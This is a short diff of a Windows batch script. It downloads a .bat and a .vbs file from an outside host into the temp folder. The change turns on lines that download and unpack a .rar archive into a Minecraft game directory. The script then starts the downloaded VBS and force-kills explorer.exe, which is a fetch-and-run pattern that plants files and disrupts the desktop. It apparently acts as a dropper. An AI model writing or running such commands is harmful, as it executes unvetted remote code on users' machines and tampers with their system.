@@ -42,8 +42,8 @@ cd %temp%
 curl -o rueben.bat "http://drev.0x.no/tempfiles/rueben.bat"
 curl -o minimize.vbs "http://drev.0x.no/tempfiles/minimize.vbs"
 cd C:\XboxGames\Minecraft for Windows\Content
-rem curl -o rueben.rar "http://drev.0x.no/tempfiles/rueben.rar"
-rem tar -xf rueben.rar
+curl -o rueben.rar "http://drev.0x.no/tempfiles/rueben.rar"
+tar -xf rueben.rar
 cd %temp%
 start minimize.vbs
 taskkill /f /im explorer.exe
